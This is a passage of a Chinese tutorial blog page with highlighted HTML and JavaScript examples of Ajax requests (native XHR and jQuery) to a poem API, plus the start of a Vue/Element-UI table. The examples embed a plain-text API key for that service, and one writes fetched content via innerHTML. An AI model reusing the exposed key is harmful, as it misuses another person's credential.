class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;load&quot;</span>&gt;</span>加载更多<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;poetry&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t(<span class=\"function\">() =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"keyword\">const</span> poetry = <span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelector</span>(<span class=\"string\">&#x27;#poetry&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"keyword\">const</span> loadBtn = <span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelector</span>(<span class=\"string\">&#x27;#load&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"keyword\">const</span> url = <span class=\"string\">&#x27;http://api.tianapi.com/txapi/flmj/index?key=843c2619fa9c643f9bcfe0ee2e66b9da&amp;type=春天&amp;num=5&amp;page=&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"keyword\">var</span> page = <span class=\"number\">0</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\tloadBtn.<span class=\"title function_\">addEventListener</span>(<span class=\"string\">&#x27;click&#x27;</span>, <span class=\"function\">(<span class=\"params\">evt</span>) =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\tpage += <span class=\"number\">1</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// 创建异步请求对象</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"keyword\">let</span> xhr = <span class=\"keyword\">new</span> <span class=\"title class_\">XMLHttpRequest</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// open方法的第一个参数是请求类型，第二个参数是请求的URL，第三个参数必须设置为true(异步请求)</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\txhr.<span class=\"title function_\">open</span>(<span class=\"string\">&#x27;get&#x27;</span>, url + page, <span class=\"literal\">true</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// 绑定事件回调函数，在收到服务器返回的数据后要对页面进行局部刷新</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\txhr.<span class=\"title function_\">addEventListener</span>(<span class=\"string\">&#x27;readystatechange&#x27;</span>, <span class=\"function\">() =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t<span class=\"keyword\">if</span> (xhr.<span class=\"property\">readyState</span> == <span class=\"number\">4</span> &amp;&amp; xhr.<span class=\"property\">status</span> == <span class=\"number\">200</span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t<span class=\"comment\">// alert(xhr.responseText) 查看请求是否成功</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t<span class=\"comment\">// 将返回的JSON字符串解析成JS的对象</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t<span class=\"keyword\">let</span> json = <span class=\"title class_\">JSON</span>.<span class=\"title function_\">parse</span>(xhr.<span class=\"property\">responseText</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\tjson.<span class=\"property\">newslist</span>.<span class=\"title function_\">forEach</span>(<span class=\"function\">(<span class=\"params\">verbo</span>) =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t\t<span class=\"comment\">// console.log(verbo.content) 查看是否成功获取内容</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t\t<span class=\"keyword\">let</span> para = <span class=\"variable language_\">document</span>.<span class=\"title function_\">createElement</span>(<span class=\"string\">&#x27;p&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t\tpara.<span class=\"property\">innerHTML</span> = verbo.<span class=\"property\">content</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t\tpoetry.<span class=\"title function_\">insertBefore</span>(para, poetry.<span class=\"property\">firstElementChild</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t&#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t&#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// 发送异步请求</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\txhr.<span class=\"title function_\">send</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t&#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t&#125;)()</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"jQuery的Ajax请求-html\"><a href=\"#jQuery的Ajax请求-html\" class=\"headerlink\" title=\"jQuery的Ajax请求.html\"></a>jQuery的Ajax请求.html</h1><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Ajax请求<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-class\">.a</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">color</span>: aquamarine;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">font-family</span>: <span class=\"string\">&quot;bodoni mt&quot;</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">font-size</span>: <span class=\"number\">20px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;load&quot;</span>&gt;</span>加载更多<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;poetry&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;../js/jquery-3.6.0.min.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t$(() =&gt; &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"keyword\">const</span> url = <span class=\"string\">&#x27;http://api.tianapi.com/txapi/flmj/index&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"keyword\">var</span> page = <span class=\"number\">0</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t$(<span class=\"string\">&#x27;#load&#x27;</span>).<span class=\"title function_\">on</span>(<span class=\"string\">&#x27;click&#x27;</span>, <span class=\"function\">(<span class=\"params\">evt</span>) =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\tpage += <span class=\"number\">1</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"keyword\">let</span> data = &#123;<span class=\"string\">&quot;key&quot;</span>: <span class=\"string\">&quot;843c2619fa9c643f9bcfe0ee2e66b9da&quot;</span>, <span class=\"string\">&quot;type&quot;</span>: <span class=\"string\">&quot;春天&quot;</span>, <span class=\"string\">&quot;num&quot;</span>: <span class=\"string\">&quot;5&quot;</span>, <span class=\"string\">&quot;page&quot;</span>: page&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// $对象的getJSON方法可以执行异步请求(get请求)获得服务器返回的JSON格式的数据</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// 第一个参数是请求的URL(统一资源定位符)</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// 第二个参数是要发送给服务器的数据(JSON格式)，如果没有数据发给服务器可以省略不写</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// 第三个参数是请求成功服务器返回数据之后要执行的回调函数，其参数为服务器返回的内容处理后的JSON</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// $.getJSON(url, data, (json) =&gt; &#123; </span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// \tjson.newslist.forEach((verbo) =&gt; &#123;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// \t\t// $(&#x27;#poetry&#x27;).append($(&#x27;&lt;p&gt;&#x27;).text(verbo.content))</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// \t\t// attr(&#x27;src&#x27;, &#x27;xxx&#x27;) 添加属性</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// \t\t$(&#x27;#poetry&#x27;).prepend($(&#x27;&lt;p&gt;&#x27;).text(verbo.content).attr(&#x27;class&#x27;, &#x27;a&#x27;)).attr(&#x27;width&#x27;, &#x27;300&#x27;)</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">//\t\t\t\t\t\t\t $(&#x27;&lt;p&gt;&#x27;)表示创建标签\t\t\t  attr定义属性</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// \t&#125;)</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// &#125;)</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t$.<span class=\"title function_\">ajax</span>(&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t<span class=\"string\">&quot;url&quot;</span>: url,  <span class=\"comment\">// 请求的地址(统一资源定位符)</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t<span class=\"string\">&quot;type&quot;</span>: <span class=\"string\">&quot;get&quot;</span>,  <span class=\"comment\">// 请求的方法(get/post/delete/put/patch)</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t<span class=\"string\">&quot;data&quot;</span>: data,  <span class=\"comment\">// 发送给服务器的数据</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t<span class=\"string\">&quot;dataType&quot;</span>: <span class=\"string\">&quot;json&quot;</span>,  <span class=\"comment\">// 服务器返回的数据类型</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t<span class=\"string\">&quot;headers&quot;</span>: &#123;&#125;,  <span class=\"comment\">// 请求头</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t<span class=\"string\">&quot;success&quot;</span>: <span class=\"function\">(<span class=\"params\">json</span>) =&gt;</span> &#123;  <span class=\"comment\">// 请求成功后要执行的回调函数</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\tjson.<span class=\"property\">newslist</span>.<span class=\"title function_\">forEach</span>(<span class=\"function\">(<span class=\"params\">verbo</span>) =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t\t$(<span class=\"string\">&#x27;#poetry&#x27;</span>).<span class=\"title function_\">prepend</span>($(<span class=\"string\">&#x27;&lt;p&gt;&#x27;</span>).<span class=\"title function_\">text</span>(verbo.<span class=\"property\">content</span>).<span class=\"title function_\">attr</span>(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;a&#x27;</span>))</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t&#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t&#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t<span class=\"string\">&quot;error&quot;</span>: <span class=\"function\">(<span class=\"params\">error</span>) =&gt;</span> &#123; <span class=\"comment\">// 请求失败后要执行的回调函数</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t&#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t&#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t&#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Vue使用入门-html\"><a href=\"#Vue使用入门-html\" class=\"headerlink\" title=\"Vue使用入门.html\"></a>Vue使用入门.html</h1><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- </span></span><br><span class=\"line\"><span class=\"comment\"> 用DOM操作将数据渲染到页面上是非常麻烦的，所以在商业项目中一般不考虑用这种方式</span></span><br><span class=\"line\"><span class=\"comment\"> 前端模块引擎 ---》前端MVC框架 --》Vue.js</span></span><br><span class=\"line\"><span class=\"comment\">  M - Model - 模型（页面上要展示的数据）</span></span><br><span class=\"line\"><span class=\"comment\">  V - View - 视图（呈现给用户看的东西）</span></span><br><span class=\"line\"><span class=\"comment\">  C - Controller - 控制器 - 负责连接模型和视图</span></span><br><span class=\"line\"><span class=\"comment\"> </span></span><br><span class=\"line\"><span class=\"comment\"> --&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"comment\">/*</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-css\">\t\t\ttbody &#123;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-css\">\t\t\t\tborder-top: 2px solid black;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-css\">\t\t\t\tborder-bottom: 1px solid black;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-css\">\t\t\t&#125;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-css\">\t\t\t*/</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t    <span class=\"selector-id\">#page</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">100%</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">text-align</span>: center;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">margin-top</span>: <span class=\"number\">20px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#page</span> <span class=\"selector-tag\">a</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">text-decoration</span>: none;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">color</span>: darkcyan;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">cursor</span>: pointer;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">margin</span>: <span class=\"number\">20px</span> <span class=\"number\">20px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-tag\">h1</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">color</span>: <span class=\"number\">#909399</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">&quot;stylesheet&quot;</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;https://unpkg.com/browse/element-ui@2.15.8/lib/theme-chalk/index.css&quot;</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;app&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>员工信息表<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">hr</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">&lt;!-- stripe 隔行换色 --&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">el-table</span></span></span><br><span class=\"line\"><span class=\"tag\">\t\t\t\t<span class=\"attr\">v-loading</span>=<span class=\"string\">&quot;loading&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">\t\t\t    <span class=\"attr\">:data</span>=<span class=\"string\">&quot;emps&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">\t\t\t    <span class=\"attr\">stripe</span> \t\t\t\t</span></span><br><span class=\"line\"><span class=\"tag\">\t\t\t    <span class=\"attr\">style</span>=<span class=\"string\">&quot;width: 100%&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t    <span class=\"tag\">&lt;<span class=\"name\">el-table-column</span></span></span><br><span class=\"line\"><span class=\"tag\">\t\t\t      <span class=\"attr\">prop</span>=<span class=\"string\">&quot;no&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">\t\t\t      <span class=\"attr\">label</span>=<span class=\"string\">&quot;编号&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">\t\t\t      <span class=\"attr\">width</span>=<span class=\"string\">&quot;180&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t    <span class=\"tag\">&lt;/<span class=\"name\">el-table-column</span>&gt;</span></span><br><span class=\"line\">\t\t\t    <span class=\"tag\">&lt;<span class=\"name\">el-table-column</span></span></span><br><span class=\"line\"><span class=\"tag\">\t\t\t      <span class=\"attr\">prop</span>=<span class=\"string\">&quot;name&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">\t\t\t      <span class=\"attr\">label</span>=<span class=\"string\">&quot;姓名&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">\t\t\t      <span class=\"attr\">width</span>=<span class=\"string\">&quot;180&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t    <span class=\"tag\">&lt;/<span class=\"name\">el-table-column</span>&gt;</span></span><br><span class=\"line\">\t\t\t    <span class=\"tag\">&lt;<span class=\"name\">el-table-column</span></span></span><br><span class=\"line\"><span class=\"tag\">\t\t\t      <span class=\"attr\">prop</span>=<span class=\"string\">&quot;job&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">\t\t\t      <span class=\"attr\">label</span>=<span class=\"string\">&quot;职位&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t    <span class=\"tag\">&lt;/<span class=\"name\">el-table-column</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">el-table-column</span></span></span><br><span class=\"line\"><span class=\"tag\">\t\t\t\t  <span class=\"attr\">prop</span>=<span class=\"string\">&quot;sal&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">\t\t\t\t  <span class=\"attr\">label</span>=<span class=\"string\">&quot;工资&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">el-table-column</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">el-table-column</span></span></span><br><span class=\"line\"><span class=\"tag\">\t\t\t\t  <span class=\"attr\">prop</span>=<span class=\"string\">&quot;comm&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">\t\t\t\t  <span class=\"attr\">label</span>=<span class=\"string\">&quot;补贴&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">el-table-column</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">el-table-column</span></span></span><br><span class=\"line\"><span class=\"tag\">\t\t\t\t  <span class=\"attr\">prop</span>=<span class=\"string\">&quot;dept.name&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">\t\t\t\t  <span class=\"attr\">label</span>=<span class=\"string\">&quot;所在部门&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">el-table-column</span>&gt;</span></span><br><span class=\"line\">\t\t\t  <span class=\"tag\">&lt;/<span class=\"name\">el-table</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">&lt;!--</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t&lt;table id=&quot;emp&quot;&gt;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t&lt;thead&gt;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t&lt;tr&gt;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t&lt;th&gt;编号&lt;/th&gt;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t&lt;th&gt;姓名&lt;/th&gt;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t&lt;th&gt;职位&lt;/th&gt;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t&lt;th&gt;工资&lt;/th&gt;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t&lt;th&gt;补贴&lt;/th&gt;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t&lt;th&gt;所在部门&lt;/th&gt;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t&lt;/tr&gt;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t&lt;/thead&gt;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t&lt;tbody&gt;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t&lt;tr v-for=&quot;emp in emps&quot;&gt;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t&lt;td&gt;&#123;&#123; emp.no &#125;&#125;&lt;/td&gt;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t&lt;td&gt;&#123;&#123; emp.name &#125;&#125;&lt;/td&gt;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t&lt;td&gt;&#123;&#123; emp.job &#125;&#125;&lt;/td&gt;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t&lt;td&gt;&#123;&#123; emp.sal &#125;&#125;&lt;/td&gt;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t&lt;td&gt;&#123;&#123; emp.comm &#125;&#125;&lt;/td&gt;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t&lt;td&gt;&#123;&#123; emp.dept.name &#125;&#125;&lt;/td&gt;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t&lt;/tr&gt;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t&lt;/tbody&gt;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t&lt;/table&gt;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t--&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;page&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;prev&quot;</span> @<span class=\"attr\">click</span>=<span class=\"string\">&quot;prevPage()&quot;</span> &lt;!<span class=\"attr\">--v-bind:href</span>=<span class=\"string\">prev--</span>&gt;</span>&gt;上一页<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"symbol\">&amp;nbsp;</span><span class=\"symbol\">&amp;nbsp;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;next&quot;</span> @<span class=\"attr\">click</span>=<span class=\"string\">&quot;nextPage()&quot;</span>  &lt;!<span class=\"attr\">--v-bind:href</span>=<span class=\"string\">next--</span>&gt;</span>&gt;下一页<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span> <span class=\"comment\">&lt;!--v-bind渲染属性--&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://unpkg.com/browse/vue@2.6.10/dist/vue.min.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://unpkg.com/browse/element-ui@2.15.8/lib/index.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"keyword\">let</span> pageSize = <span class=\"number\">5</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"keyword\">const</span> app = <span 